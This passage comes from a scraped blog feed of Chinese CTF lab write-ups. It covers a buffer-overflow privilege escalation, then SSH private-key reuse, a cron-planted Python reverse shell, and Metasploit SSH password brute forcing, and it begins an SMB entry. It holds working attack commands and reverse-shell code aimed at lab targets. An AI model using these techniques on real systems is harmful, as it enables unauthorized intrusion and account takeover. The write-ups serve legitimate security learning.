src="https://img-blog.csdnimg.cn/20200528080553827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这两个好像是一样，尝试cat这个文件<br><img src="https://img-blog.csdnimg.cn/20200528080722806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>就这？？就这啊？找到了第二个flag，还不用提升权限就得到了。<br>flag2{use_the_source_luke}</p><h2 id="第三个flag"><a href="#第三个flag" class="headerlink" title="第三个flag"></a>第三个flag</h2><p>审计代码，查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">// You&#x27;re getting close! Here&#x27;s another flag:</span></span><br><span class="line"><span class="comment">// flag2&#123;use_the_source_luke&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> program[] = <span class="string">&quot;/usr/local/sbin/message&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span> authorized[] = <span class="string">&quot;Simon&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What is your name?\n&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only compare first five chars to save precious cycles:</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(authorized, buf, <span class="number">5</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello %s! Here is your message:\n\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">// This is safe as the user can&#x27;t mess with the binary location:</span></span><br><span class="line">        execve(program, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sorry %s, you&#x27;re not %s! The Internet Police have been informed of this violation.\n&quot;</span>, buf, authorized);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个数组，一个是执行文件所在目录，一个空数组，一个认证的数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> program[] = <span class="string">&quot;/usr/local/sbin/message&quot;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> authorized[] = <span class="string">&quot;Simon&quot;</span>;</span><br></pre></td></tr></table></figure><p>然后一条询问语句：<code>What is your name?</code><br>然后将输入的内容赋值给buf<br>下面是重点，一个判断语句，判断输入的内容的前五个字符与这个认证数组 是否不相等。<br>如果不相等就打印出来我想要的内容，反之就Sorry了。<br>执行一下，这个文件。<br><img src="https://img-blog.csdnimg.cn/20200528082300342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>提示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hi Simon, I hope you like our private messaging system.</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;m really happy with how it worked out!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you&#x27;</span>re interested <span class="keyword">in</span> how it works, I<span class="string">&#x27;ve left a copy of the source code in my home directory.</span></span><br></pre></td></tr></table></figure><p>那么如果输入溢出了，会回复什么。<br>输入溢出，然后跳转到bin目录下，尝试一下。通过下面一条命令来提升权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimonAAAAAAAAAAAAAAA/bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200528083240607.png" alt="j4y" loading="lazy"><br>发现已经得到了root权限，检查一下的确是root用户了。<br>现在应该就能cat flag.txt了吧<br><img src="https://img-blog.csdnimg.cn/20200528083415767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>最后一个flag拿到了。</p><h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>总结此次学习，emmm感觉挺有意思的。回头翻一下看看自己都学到了什么知识。</p><ul><li>dirb对隐藏文件的探测。</li><li>强大的ssh2john进行解密。</li><li>查找root用户权限的文件</li><li>简单的提升权限。(以后多了解一下这个，专门学习一下)</li><li>最后还有看报错。中间有几个错误进行报错了，解决报错的感觉很爽哈哈。报错大致是以下几个</li></ul><ol><li>John无法找到此命令的解决办法</li><li>linux系统中无法输入<code>|</code>管道符的问题解决。</li><li>溢出失败的解决(这个可能是我自己操作有问题哈，出现这个问题应该不多)。就是溢出输入后还是没有root权限。发现是操作失误，忽略掉哈哈。</li></ol><p>文末寄语：</p><blockquote><p>脚步不能达到的地方，眼光可以到达；眼光不能到达的地方，精神可以飞到。——《悲惨世界》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————SSH-服务渗透root主机</title>
      <link href="/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94SSH-%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8Froot%E4%B8%BB%E6%9C%BA/"/>
      <url>/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94SSH-%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8Froot%E4%B8%BB%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CTF系列之SSH服务渗透root主机靶场试验。</p><h1 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h1><p>安装靶场时除了差错。说小也不小，害<br><img src="https://img-blog.csdnimg.cn/20200531221733886.jpg" alt="j4y" loading="lazy"><br>原本在vmware里安装靶场，但是出现这样的情况。<br><img src="https://img-blog.csdnimg.cn/20200531221918507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200531221939219.png" alt="j4y" loading="lazy"><br>绝望，找了解决办法，但是不适合我。我吐了，修修改改半天。还是不行。<br>还是先说这个解决办法：<br>先将ova文件后缀改为<code>.rar</code>或者<code>.zip</code>然后解压该文件。会有两个文件被解压出来，分别是<code>.ovf</code>和<code>.vmdk</code>,修改<code>.ovf</code>文件用记事本打开，修改这里<br><img src="https://img-blog.csdnimg.cn/20200531222522938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后再次尝试打开，如果运气好的话，就可以打开了。<br>但是我没成功，于是开始自己瞎鼓捣。终于皇天不负有心人，搞了俩小时，终于给我整明白了。<br>下面是我的解决方法：<br>下载了Oracle VirtualBox这个软件，又是一个虚拟机的软件，对的。<br>当时想的是，既然它原本是Oracle VirtualBox的版本，那么就下载个试试。然后成功了。可以打开虚拟靶场了。这目前是适合我的解决办法。<br>当然，问题又来了。<br>靶机在Oracle VirtualBox上，kali在vmware上，😂😂😂😂这他喵怎么探测到靶机的IP啊。这个问题就是我头疼了将近俩小时的问题。至于探测方法以及设置问题在下面。</p><h1 id="实验前的准备"><a href="#实验前的准备" class="headerlink" title="实验前的准备"></a>实验前的准备</h1><h2 id="探测IP"><a href="#探测IP" class="headerlink" title="探测IP"></a>探测IP</h2><p>设置问题，<br>vmware中<br><img src="https://img-blog.csdnimg.cn/20200531224340710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>虚拟网络编辑器<br><img src="https://img-blog.csdnimg.cn/20200531224430864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200531224526312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以根据自己的设置来，然后点击应用。<br>然后在kali的虚拟机设置里面设置桥接<br><img src="https://img-blog.csdnimg.cn/20200531224651672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>Oracle VirtualBox中<br><img src="https://img-blog.csdnimg.cn/20200531224759453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>设置成和kali的一样的。然后就大功告成了。<br>进kali探测IP地址就行了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200531224928411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>发现kali的IP是<code>192.168.1.6</code><br>然后输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200531225156906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>就是它了。然后nmap进一步探测信息查看是否正确<br><img src="https://img-blog.csdnimg.cn/20200531225343319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>好了，证据确凿，就是它了。<br>靶机IP：<code>192.168.1.5</code></p><h1 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h1><h2 id="拿到第一个用户权限"><a href="#拿到第一个用户权限" class="headerlink" title="拿到第一个用户权限"></a>拿到第一个用户权限</h2><p>探测靶场全部信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v 192.168.1.5</span><br></pre></td></tr></table></figure><p>探测靶场的操作系统类型与版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.1.5</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200531230344543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h3 id="分析探测结果"><a href="#分析探测结果" class="headerlink" title="分析探测结果"></a>分析探测结果</h3><p>针对ssh服务的22号端口。<br>考虑：</p><ul><li><p>1、暴力破解</p></li><li><p>2、私钥泄露（私钥有没有对应的密码。是否可以找到私钥的用户名）<br>对于开放http服务的80端口或者其他端口的靶场<br>优先考虑：</p></li><li><p>1、通过浏览器访问对应的靶场http服务，如http://靶场IP地址:http服务端口</p></li><li><p>2、使用探测工具对http的目录进行探测，如dirb http://靶场IP地址:http服务端口/<br>==特别注意：特殊端口（大于1024的端口）==<br><img src="https://img-blog.csdnimg.cn/20200531231723572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>先继续</p><h3 id="挖掘敏感信息"><a href="#挖掘敏感信息" class="headerlink" title="挖掘敏感信息"></a>挖掘敏感信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.5/</span><br></pre></td></tr></table></figure><p>然后探测出来一堆<br><img src="https://img-blog.csdnimg.cn/20200531232158488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后从第一个开始进行访问。运气不错，第二个就得到了这么多信息。再深入查看(还是挨个查看)<br><img src="https://img-blog.csdnimg.cn/20200531232302856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后发现了这个名字很奇怪的txt文本有东西，是rsa<br><img src="https://img-blog.csdnimg.cn/20200531232441108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后就到解析网站解析了一番，<a href="http://ctf.ssleye.com/priv_asys.html">传送门</a><br>然后使用nikto扫描器来挖掘敏感信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 192.168.1.5</span><br></pre></td></tr></table></figure><p>特别注意config等特殊敏感文件，要细读扫描的结果。挖掘可以利用的敏感信息；<img src="https://img-blog.csdnimg.cn/20200531233148763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>利用信息继续进行。<br>将私钥文件下载到桌面上，方便操作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://192.168.1.5/icons/VDSoyuAXiO.txt&quot;</span><br></pre></td></tr></table></figure><p>然后改个名<br><img src="https://img-blog.csdnimg.cn/20200531233753813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后，查看id_rsa文件的权限，进行提权<br><img src="https://img-blog.csdnimg.cn/20200531234008398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>利用私钥尝试登录服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa martin@192.168.1.5</span><br></pre></td></tr></table></figure><p>其中martin是上面已经得到的一个可能的用户名。<br>可以看到已经连接成功<br><img src="https://img-blog.csdnimg.cn/20200531234509579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后将能看到的目录下的文件全列出来找一遍<br><img src="https://img-blog.csdnimg.cn/20200531234738398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>现在相当于拿到了第一个用户了。</p><h2 id="渗透root用户"><a href="#渗透root用户" class="headerlink" title="渗透root用户"></a>渗透root用户</h2><p>一般flag会在root用户和对应的用户组。<br>使用以下几条命令进行查看信息。所以这个时候应该是提权。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd#查看所有用户的列表</span><br><span class="line">cat /etc/group#查看用户组</span><br><span class="line">find / -user 用户名#查看属于某些用户的文件</span><br><span class="line">/tmp#查看缓冲文件目录</span><br></pre></td></tr></table></figure><p>查看过之后也没发现什么特别的信息，<br><img src="https://img-blog.csdnimg.cn/20200601090950954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>不过发现几个用户。</p><h3 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h3><p>通过 /etc/crontab 文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务。</p></li></ul><p>cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶场机器的某个文件。</p><p><img src="https://img-blog.csdnimg.cn/2020060111063823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>如果在/etc/crontab 下有某个用户的定时计划文件，但是具体目录下没有这个定时执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。</p><p>如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。</p><p>看到这个文件，但是ls后什么都没发现。所以自己创建反弹shell然后改成这个名字，让它定时执行。</p><p>查看空闲端口，随便挑个进行侦听，这里我选择4444端口。<br>查看占用端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lpv [未占用端口]</span><br></pre></td></tr></table></figure><p>查看占用端口<br>netstat -pantu<br>然后没有占用4444端口，那就可以使用。<br>自创反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket,os,subprocess</span><br><span class="line"></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;192.168.1.5&quot;</span>,<span class="number">4444</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200601104553923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>熟练使用vi命令真的重要。<br>再改成那个定时自动执行的文件的名字<br>提权，执行权限给它</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x sekurity.py</span><br></pre></td></tr></table></figure><p>进行侦听端口后，程序是5分钟执行一次，最多等待5分钟就可以了。</p><p>但是我的没有显示，一直都是这个样子<br><img src="https://img-blog.csdnimg.cn/20200601125131327.png" alt="j4y" loading="lazy"><br>烦。重复执行好几遍都没成功，一直是这样的。<br>吐了。看过教程，发现后面的步骤也没啥了。就是查一下是不是root用户，如果是，进一步探测，不是就放弃这个用户，继续下一个。<br>使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">当前用户名</span></span><br><span class="line">whoami</span><br><span class="line"><span class="meta">#</span><span class="bash">查看对应权限</span></span><br><span class="line">id</span><br><span class="line"><span class="meta">#</span><span class="bash">提权</span></span><br><span class="line">su root</span><br></pre></td></tr></table></figure><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>最后一个用户，没有其他办法只能进行暴力破解，使用hydra、medusa等工具。<br>使用github上的一个工具创建字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> htts://github.com/jeanphorn/common-password.git</span><br><span class="line"><span class="built_in">cd</span> common-password</span><br><span class="line"><span class="comment">#然后执行</span></span><br><span class="line">./cupp.py -i</span><br></pre></td></tr></table></figure><p>当然，如果是python3的话可能会出错。我这里使用python2版本执行就可以了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 cupp.py -i</span><br></pre></td></tr></table></figure><p>然后输入要破解的用户名，生成字典文件。<br><img src="https://img-blog.csdnimg.cn/20200601131632687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>字典文件生成完毕，可以进行暴力破解，这里使用metasploit破解ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">-- msf&gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">--msf auxiliary(ssh_login) &gt; set rhost 192.168.1.5</span><br><span class="line">--msf auxiliary(ssh_login) &gt; set username hadi</span><br><span class="line">--msf auxiliary(ssh_login) &gt; set pass_file hadi.txt[的路径]</span><br><span class="line">--msf auxiliary(ssh_login) &gt; run</span><br></pre></td></tr></table></figure><p>开始破解，破解之后是自动生成会话，可以使用终端<br><img src="https://img-blog.csdnimg.cn/20200601135332495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>所以使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200601135513607.png" alt="j4y" loading="lazy"><br>就变成了和平时使用的终端一样了。<br>然后提权<br><img src="https://img-blog.csdnimg.cn/20200601135616324.png" alt="j4y" loading="lazy"><br>到这里进入了root用户<br><img src="https://img-blog.csdnimg.cn/20200601135856302.png" alt="j4y" loading="lazy"><br>然后查找flag，一般是在root目录下，所以直接进入root目录，查看<br>得到flag<br><img src="https://img-blog.csdnimg.cn/20200601140004203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>结束。<br>花了很长时间，学到的东西也很多。继续努力啊。</p><p>文末寄语：</p><blockquote><p>有些乐趣和人生际遇或许我们永远不会有。然而正是在这些“得不到”和“有所得”之间，我们确立了自己在这个世界上的位置。——荞麦</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————SMB信息泄露</title>
      <link href="/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CTF靶场系列第三部——利用SMB信息泄漏最终拿到flag</p><h1 id="SMB服务介绍"><a href="#SMB服务介绍" class="headerlink" title="SMB服务介绍"></a>SMB服务介绍</h1><blockquote><p>SMB（Server Message<br>Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。<br>SMB协议是基于TCP-NETBIOS下的，一般端口使用为139，445</p></blockquote><p>emmm，具体的请百度，就不搬运了。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>1、kali攻击机IP：<code>192.168.40.132</code><br>2、靶场IP：<code>192.168.40.146</code><br>目标：拿到靶场中的flag</p><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>对于只是给定一个对应lP地址的靶场机器，我们需要用对其进行扫描，探测开放的服务。<br>渗透其实是针对服务的漏洞探测，然后进行对应的数据包发送，获取机器的最高权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV [ip]#挖掘开放服务信息</span><br><span class="line">nmap -A -v -T4 [ip]#挖掘靶场全部信息</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200717110140882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>信息显示开启了<code>139</code>和<code>445</code>端口，mysql也开启了。<br>还有smb的版本信息等。<br>然后第二条命令，扫描靶场全部信息<br><img src="https://img-blog.csdnimg.cn/20200717111412311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" 